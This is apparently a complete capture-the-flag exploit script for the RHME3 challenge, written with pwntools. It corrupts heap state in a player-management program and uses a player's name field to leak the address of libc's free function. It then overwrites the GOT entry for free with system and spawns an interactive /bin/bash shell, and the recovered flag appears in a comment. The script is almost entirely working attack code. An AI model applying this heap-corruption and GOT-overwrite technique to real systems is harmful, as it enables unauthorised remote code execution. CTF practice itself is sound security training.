from pwn import *
from struct import pack, unpack
# context.log_level = 'DEBUG'

r = remote('pwn.rhme.riscure.com', 1337)
# r = process("./main.elf")
r.recvuntil("Your choice: ")


def create_player(name):
    print "[+] Creating player"
    r.send("1\n")
    r.send(name + "\n")
    r.send("255")
    r.send("255")
    r.send("255")
    r.send("255")
    r.recvuntil("Your choice: ")

def select_player(i):
    print "[+] Selecting player %d" % i
    r.send("3\n%d\n" % i)
    r.recvline()
    print "   ", r.recvline().strip()
    print "   ", r.recvline().strip()
    r.recvuntil("Your choice: ")

def set_name(i):
    print "[+] Setting selected name to %s" % repr(i)
    r.send("4\n")
    r.recvuntil("Your choice: ")
    
    r.send("1\n%s\n" % i)
    r.recvuntil("Your choice: ")
    
    r.send("0\n")
    r.recvuntil("Your choice: ")

def delete_player(i):
    print "[+] Deleting player %i" % i
    r.send("2\n%d\n" % i)
    r.recvuntil("Your choice: ")

def leak():
    print "[+] Leaking"
    r.send("5\n")
    name = r.recvline()[7:-1]
    vals = r.recvline()[10:-1].split(',')
    r.recvuntil("Your choice: ")
    return [name] + vals



# Quick and dirty heap misalignement
for x in range(11):
    create_player("A"*0x78)
select_player(0)
for x in range(11):
    delete_player(x)


# Next created player will have the name overwrite our selected player
# Allowing us to both read and write via the name attribute
create_player("A"*0x10 + pack("<Q", 0x603018) + "A"*0x20)
libc_free = unpack("<Q", leak()[0].ljust(8, '\x00'))[0]
print "Libc FREE @ 0x%x" % libc_free


# Load the provided libc and calculate the address of `system` based on the leaked address of `free`
e = ELF('libc.so.6')
base = libc_free - e.symbols['free']
libc_system = base + e.symbols['system']
set_name(pack("<Q", libc_system))


# Now let's create out system command
# We send delete manually as bash will be spawned
create_player("/bin/bash")
r.send("2\n1\n")


# RHME3{h3ap_0f_tr0uble?}
r.interactive()
